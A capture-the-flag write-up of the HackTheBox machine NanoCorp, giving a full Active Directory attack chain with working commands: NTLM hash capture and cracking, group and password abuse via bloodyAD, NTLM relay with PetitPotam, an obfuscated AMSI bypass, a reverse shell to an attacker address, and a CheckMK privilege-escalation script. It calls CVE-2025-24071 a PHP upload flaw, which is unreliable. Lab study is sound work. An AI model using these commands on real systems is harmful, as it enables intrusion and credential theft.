---
title: "HTB Machine NanoCorp"
date: 2025-11-13T19:59:11+02:00
draft: false 
tags: ["hackthebox", "writeup", "windows", "hard", "season 9"]
categories: ["CTF"]
---

# NanoCorp - HackTheBox Write-Up

## Machine Overview

**Machine Name:** NanoCorp  
**Difficulty:** Medium/Hard  
**Operating System:** Windows (Active Directory)  
**IP Address:** 10.129.9.141  

---

## Executive Summary

This Active Directory box involves exploiting multiple vulnerabilities to achieve SYSTEM-level access:

1. **Initial Access:** CVE-2025-24071 (PHP File Upload Vulnerability)
2. **Credential Capture:** NTLM hash capture via Responder
3. **Lateral Movement:** Active Directory privilege escalation through group membership manipulation
4. **Alternative Path:** NTLM Relay attack via DNS poisoning
5. **Privilege Escalation:** CVE-2024-0670 (CheckMK Agent Local Privilege Escalation)

---

## Enumeration

### Port Scanning

```bash
nmap -p- -sC -sV -oA nmap/nanocorp 10.129.9.141
```

**Key Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Apache 2.4.58 (PHP 8.2.12) |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 389 | LDAP | Microsoft Windows Active Directory |
| 445 | SMB | Microsoft-DS |
| 5986 | WinRM SSL | Microsoft HTTPAPI httpd 2.0 |
| 6556 | CheckMK Agent | Version 2.1.0p10 |

### Domain Discovery

**Discovered Subdomains:**
- `nanocorp.htb` (main domain)
- `hire.nanocorp.htb` (recruitment portal)
- `dc01.nanocorp.htb` (domain controller)

Add entries to `/etc/hosts`:

```bash
echo "10.129.9.141 nanocorp.htb hire.nanocorp.htb dc01.nanocorp.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

The `hire.nanocorp.htb` subdomain hosts a career opportunities portal that accepts CV/resume uploads in ZIP format.

---

## Initial Access - CVE-2025-24071

### Vulnerability Description

CVE-2025-24071 is a PHP file upload vulnerability that allows arbitrary file execution through malicious ZIP archives.

### Exploit Steps

**1. Clone the exploit:**

```bash
git clone https://github.com/0x6rss/CVE-2025-24071_PoC
cd CVE-2025-24071_PoC
```

**2. Generate malicious payload:**

```bash
python3 poc.py
```

**Inputs:**
- File name: `cv`
- IP Address: `<your_attacker_ip>`

This generates a malicious ZIP file that triggers an NTLM authentication request.

**3. Start Responder to capture NTLM hashes:**

```bash
sudo responder -I tun0
```

**4. Upload the ZIP file** to `http://hire.nanocorp.htb`

### Captured Credentials

**NTLM Hash:**
```
web_svc::NANOCORP:17e6bd23ca1ea6b9:D7BB29D79B52C847F78BC5121E5C7998:...
```

**5. Crack the hash:**

```bash
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt
```

**Retrieved Credentials:**
- **Username:** `web_svc`
- **Password:** `dksehdgh712!@#`

---

## Privilege Escalation - Active Directory Exploitation

### Method 1: Group Membership Manipulation

Using `bloodyAD` to escalate privileges by adding `web_svc` to privileged groups.

**1. Add web_svc to IT_Support group:**

```bash
bloodyAD --host dc01.nanocorp.htb --domain nanocorp.htb \
  --user web_svc --password 'dksehdgh712!@#' \
  add groupMember IT_Support web_svc
```

**2. Reset monitoring_svc password:**

```bash
bloodyAD --host dc01.nanocorp.htb --domain nanocorp.htb \
  --user web_svc --password 'dksehdgh712!@#' \
  set password monitoring_svc 'Password123!'
```

**New Credentials:**
- **Username:** `monitoring_svc`
- **Password:** `Password123!`

---

## Alternative Path - NTLM Relay Attack

### Overview

This method leverages DNS poisoning and NTLM relay to achieve direct Administrator access without cracking passwords.

### Setup DNS Poisoning

**1. Clone krbrelayx:**

```bash
git clone https://github.com/dirkjanm/krbrelayx/
cd krbrelayx
```

**2. Add DNS record pointing to attacker:**

```bash
python3 dnstool.py -u 'nanocorp.htb\WEB_SVC' -p 'dksehdgh712!@#' \
  nanocorp.htb -dc-ip <victim-ip> -dns-ip <victim-ip> \
  -a add -d <attacker_ip> \
  -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```

### Configure NTLM Relay

**3. Start ntlmrelayx with WinRM target:**

```bash
ntlmrelayx.py -smb2support -t winrms://<victim-ip> -i
```

**Note:** Use Impacket v14 dev from GitHub for WinRMs protocol support.

### Trigger Authentication Coercion

**4. Force authentication using PetitPotam:**

```bash
nxc smb nanocorp.htb -u WEB_SVC -p 'dksehdgh712!@#' \
  -M coerce_plus -o METHOD=Petitpotam \
  LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

### Access Interactive Session

**5. Connect to relayed session:**

```bash
nc 127.0.0.1 11000
```

**6. Read root flag:**

```cmd
type C:\Users\Administrator\desktop\root.txt
```

---

## WinRM Access as monitoring_svc

### Time Synchronization

Kerberos authentication requires accurate time synchronization:

```bash
sudo ntpdate -u 10.129.9.141
```

### Connect with Evil-WinRM (Kerberos)

```bash
faketime "$(ntpdate -q 10.129.9.141 | cut -d ' ' -f 1,2)" \
  python3 evil_winrmexec.py -ssl -port 5986 \
  NANOCORP.HTB/monitoring_svc@dc01.nanocorp.htb -k \
  -spn HTTP/dc01.nanocorp.htb -dc-ip 10.129.9.141
```

### AMSI Bypass

Execute in PowerShell session to bypass Windows Defender:

```powershell
SeT-Item ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."getfiElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sETVaLUE"(  ${nULl},${tRuE} )
```

Alternative AMSI bypass script available at: https://raw.githubusercontent.com/Neosprings/neoAMSI/refs/heads/main/neo.ps1

---

## Root Access - CVE-2024-0670 (CheckMK Agent LPE)

### Vulnerability Discovery

**1. Verify CheckMK Agent is running:**

```bash
nmap -p6556 nanocorp.htb -vv
```

**2. Check version:**

```bash
nc nanocorp.htb 6556
```

**Output:**
```
<<<check_mk>>>
Version: 2.1.0p10
```

### Vulnerability Details

**CVE-2024-0670** - Local Privilege Escalation in CheckMK Agent

**Reference:** https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/

**How it works:**
1. CheckMK Agent writes `.cmd` files to `C:\Windows\Temp\` on startup
2. Filename format: `cmk_all_<PID>_1.cmd` (based on process ID)
3. Agent executes these files with SYSTEM privileges
4. If files exist as read-only, agent executes existing ones instead of creating new ones
5. We can predict the next PID and pre-create malicious `.cmd` files

### Locate CheckMK Installer

**1. List installers:**

```powershell
dir C:\Windows\Installer\
```

**2. Identify CheckMK installer:**

```powershell
$i=(New-Object -ComObject WindowsInstaller.Installer).OpenDatabase("C:\Windows\Installer\1e6f2.msi",0)
@('ProductName','ProductVersion','Manufacturer') | % { 
  $v=$i.OpenView("SELECT Value FROM Property WHERE Property='$_'")
  $v.Execute()
  $r=$v.Fetch()
  if($r){$r.StringData(1)} else {'N/A'}
  $v.Close()
}
```

**Output:**
```
Check MK Agent 2.1
2.1.0.50010
tribe29 GmbH
```

**Installer location:** `C:\Windows\Installer\1e6f2.msi`

### Create Payload

**C Source Code (`test.c`):**

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main() {
    char username[256];
    DWORD size = sizeof(username);
    char buffer[4096];
    size_t bytesRead;

    if (!GetUserNameA(username, &size)) {
        strcpy(username, "UNKNOWN");
    }

    CreateDirectoryA("C:\\test", NULL);

    FILE *out = fopen("C:\\test\\preuve.txt", "w");
    if (!out) {
        printf("ERROR: Cannot write C:\\test\\preuve.txt\n");
        return 1;
    }

    fprintf(out, "EXECUTED BY: %s\n", username);
    fprintf(out, "COMPILATION DATE: %s\n\n", __TIMESTAMP__);
    fprintf(out, "=== CONTENT OF C:\\Users\\Administrator\\Desktop\\root.txt ===\n");

    FILE *in = fopen("C:\\Users\\Administrator\\Desktop\\root.txt", "r");
    if (in) {
        while ((bytesRead = fread(buffer, 1, sizeof(buffer) - 1, in)) > 0) {
            buffer[bytesRead] = '\0';
            fprintf(out, "%s", buffer);
        }
        fclose(in);
        fprintf(out, "\n\n[OK] File read successfully.\n");
    } else {
        fprintf(out, "[ERROR] File not found or access denied.\n");
    }

    fclose(out);

    printf("User: %s\n", username);
    printf("Content copied to C:\\test\\preuve.txt\n");

    return 0;
}
```

**Compile statically:**

```bash
x86_64-w64-mingw32-gcc -o test.exe test.c -static
```

### Upload Payload to Target

**In monitoring_svc WinRM session:**

```powershell
cd $ENV:TEMP
# Upload test.exe using evil-winrm upload functionality
```

### Create Exploit Script

**PowerShell script (`temp.ps1`):**

```powershell
Remove-Item -Path "C:\Windows\Temp\cmd*" -Force -ErrorAction SilentlyContinue
while ($true) {
    1000..10000 | ForEach-Object {
        $dest = "C:\Windows\Temp\cmk_all_${_}_1.cmd"
        Copy-Item -Path "C:\Users\monitoring_svc\AppData\Local\Temp\test.exe" -Destination $dest -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $dest -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
    }
}
```

**Key points:**
- All Copy-Item parameters on ONE LINE (no backticks)
- Creates 9,000 malicious .cmd files
- Sets them as read-only
- Runs in infinite loop to continuously refresh files

### Setup web_svc Shell

**1. Download RunasCs:**

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs.zip
```

**2. Upload to monitoring_svc:**

```powershell
# In monitoring_svc shell
cd $ENV:TEMP
# Upload RunasCs.exe
```

**3. Start listener on attacker machine:**

```bash
# Using penelope
penelope

# Or using netcat
nc -lvnp 4444
```

**4. Spawn web_svc shell:**

```powershell
.\RunasCs.exe 'WEB_SVC' 'dksehdgh712!@#' cmd.exe -r <attacker_ip>:4444
```

**5. Upgrade to PowerShell in caught shell:**

```cmd
powershell
```

**6. Verify user:**

```powershell
whoami
# Output: nanocorp\web_svc
```

### Execute Exploit

**Step 1: On monitoring_svc shell, start the exploit:**

```powershell
cd $ENV:TEMP
.\temp.ps1
```

**Wait 5-10 seconds** for all .cmd files to be created.

**Step 2: On web_svc shell, trigger agent repair:**

```powershell
Get-Process | Where-Object {$_.Name -match "check"}
# Note the current PID

msiexec /fa C:\Windows\Installer\1e6f2.msi

# Wait a few seconds
Get-Process | Where-Object {$_.Name -match "check"}
# PID should have changed!
```

### Retrieve Root Flag

**On monitoring_svc shell:**

```powershell
type C:\test\preuve.txt
```

**Expected Output:**

```
EXECUTED BY: SYSTEM
DATE COMPILATION: Sun Nov  9 10:52:40 2025

=== CONTENT OF C:\Users\Administrator\Desktop\root.txt ===
HTB{your_root_flag_here}

[OK] File read successfully.
```

---

## Flags

**User Flag:** Accessible via `monitoring_svc` shell  
**Root Flag:** Retrieved via CheckMK exploit in `C:\test\preuve.txt`

---

## Attack Path Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                     Initial Access                          │
│                                                             │
│  CVE-2025-24071 (PHP Upload) → NTLM Hash Capture          │
│                     ↓                                       │
│              Crack Hash → web_svc credentials               │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│              Privilege Escalation Path 1                    │
│                                                             │
│  bloodyAD → Add web_svc to IT_Support                      │
│           → Reset monitoring_svc password                   │
│           → WinRM access as monitoring_svc                  │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│              Privilege Escalation Path 2                    │
│           (Alternative - Direct to Admin)                   │
│                                                             │
│  DNS Poisoning → NTLM Relay → Administrator access         │
└─────────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────────┐
│                  Root Access                                │
│                                                             │
│  CVE-2024-0670 (CheckMK LPE) → SYSTEM execution            │
│                              → Root flag                    │
└─────────────────────────────────────────────────────────────┘
```

---

## Key Lessons Learned

### Security Vulnerabilities Exploited

1. **Insecure File Upload Handling**
   - PHP applications must validate file contents, not just extensions
   - ZIP archives should be extracted in sandboxed environments

2. **NTLM Authentication Weaknesses**
   - NTLM hashes can be captured and relayed
   - SMB signing should be enforced
   - LDAP signing prevents relay attacks

3. **Excessive Active Directory Permissions**
   - Service accounts had unnecessary privileges
   - Group membership should follow least-privilege principle

4. **Outdated Software**
   - CheckMK Agent 2.1.0p10 has known vulnerabilities
   - Regular patching is critical

5. **Predictable Process IDs**
   - Sequential PIDs enable prediction attacks
   - Combined with writable directories, leads to privilege escalation

### Mitigation Recommendations

| Vulnerability | Mitigation |
|---------------|------------|
| CVE-2025-24071 | Update PHP, implement strict file validation, sandbox extraction |
| NTLM Relay | Enable SMB signing, LDAP signing, disable NTLM where possible |
| AD Permissions | Implement least-privilege, regular permission audits |
| CVE-2024-0670 | Update CheckMK Agent to latest version, restrict temp directory permissions |

## Conclusion

NanoCorp demonstrates a realistic Active Directory environment with multiple exploitation paths. The machine emphasizes:

- **Chain exploitation** - combining multiple vulnerabilities
- **Alternative paths** - NTLM relay vs. password cracking
- **Active Directory security** - permission misconfigurations
- **Persistence** - maintaining access through service accounts
- **Privilege escalation** - from low-privileged user to SYSTEM

This box is excellent practice for:
- Active Directory penetration testing
- NTLM attack techniques
- Windows privilege escalation
- Service exploitation

